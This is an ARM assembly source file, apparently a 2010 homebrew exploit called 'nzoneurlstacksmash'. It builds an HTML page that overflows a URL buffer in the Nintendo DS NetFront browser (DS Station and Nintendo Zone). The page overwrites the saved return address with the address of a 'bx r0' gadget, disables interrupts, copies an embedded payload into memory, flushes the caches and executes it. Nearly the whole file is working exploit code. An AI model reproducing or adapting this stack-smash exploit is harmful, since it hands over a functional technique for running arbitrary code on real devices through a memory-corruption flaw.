/*
nzoneurlstacksmash is licensed under the MIT license:
Copyright (c) 2010 yellowstar6

Permission is hereby granted, free of charge, to any person obtaining a copy of this
software and associated documentation files (the Software), to deal in the Software
without restriction, including without limitation the rights to use, copy, modify, merge,
publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons
to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies
or substantial portions of the Software.

THE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE
FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR
OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
DEALINGS IN THE SOFTWARE.
*/

/* nzoneurlstacksmash v0.2 */

.arch armv5te
.fpu softvfp
.eabi_attribute 23, 1
.eabi_attribute 24, 1
.eabi_attribute 25, 1
.eabi_attribute 26, 1
.eabi_attribute 30, 2
.eabi_attribute 18, 4

.global _start
.section .init

#define	REG_BASE	0x04000000

.incbin	"overflow.html"
#if defined(DS_STATION)
.incbin "urloverflow"
#endif
#if defined(NZONE)
.incbin "urloverflow_nzone"
#endif

@ The below are the addresses of the 'bx r0' instruction in the IRQ handler. This is the address that overwrites LR on the stack.
#if defined(DS_STATION)
.word 0x01ffb550 @ NTR SDK address
#endif

#if defined(NZONE)
.word 0x01ff9aa8 @ TWL SDK address
#endif

.ascii "ppp"
.byte 0x22 @ The '"' character.

#if defined(DS_STATION)
#define BOOTSIGNAL 0x027ffdff
#define NDSHEADER 0x027ffe00
#endif

#if defined(NZONE)
#define BOOTSIGNAL 0x02fffdff
#define NDSHEADER 0x02fffe00
#endif

_start:
.arm
adrl r7, _start
bl DC_FlushAll
bl DC_InvalidateAll
bl IC_InvalidateAll
ldr r0, =0x8278
sub r7, r7, r0
mov r0, #0
ldr r1, =0x04000208
str r0, [r1]	@ REG_IME = 0;

ldr r0, =exploit
ldr r1, =imgtag_end
ldr r2, =0x02200000
add r0, r0, r7
add r1, r1, r7

payloadcpy:
ldr r3, [r0], #4
str r3, [r2], #4
cmp r0, r1
blt payloadcpy

bl DC_FlushAll
bl DC_InvalidateAll
bl IC_InvalidateAll

ldr r0, =0x02200000
bx r0
@b exploit @ Execute the exploit/exploit.bin payload.

.pool
.align 2

DC_InvalidateAll:
.arm
mov r0, #0
mcr 15, 0, r0, cr7, cr6
bx lr

#define ICACHE_SIZE	0x2000
#define DCACHE_SIZE	0x1000
#define CACHE_LINE_SIZE	32
#define ICACHE_SIZE	0x2000
#define DCACHE_SIZE	0x1000
#define CACHE_LINE_SIZE	32

DC_FlushAll: @ From libnds, write buffer draining code was added by yellowstar6.
/*---------------------------------------------------------------------------------
	Clean and invalidate entire data cache
---------------------------------------------------------------------------------*/
	mov	r1, #0
outer_loop:
	mov	r0, #0
inner_loop:
	orr	r2, r1, r0			@ generate segment and line address
	mcr	p15, 0, r2, c7, c14, 2		@ clean and flush the line
	add	r0, r0, #CACHE_LINE_SIZE
	cmp	r0, #DCACHE_SIZE/4
	bne	inner_loop
	add	r1, r1, #0x40000000
	cmp	r1, #0
	bne	outer_loop
	mov r0, #0
	mcr 15, 0, r0, cr7, cr10, 4 @ Drain write buffer.
	bx	lr

IC_InvalidateAll: @ From libnds.
/*---------------------------------------------------------------------------------
	Clean and invalidate entire data cache
---------------------------------------------------------------------------------*/
	mov	r0, #0
	mcr	p15, 0, r0, c7, c5, 0
	bx	lr

exploit:
.incbin "exploit/exploit.bin"

imgtag_end:
.byte 0x3e
end:
.byte 0x0a
.ascii "</body>" @ NetFront will refuse to parse the image tag etc when the </body> and </html> tags are missing.
.byte 0x0a
.ascii "</html>"
.byte 0x0a
.byte 0x0a

asm_end:
.byte 0
.align 2

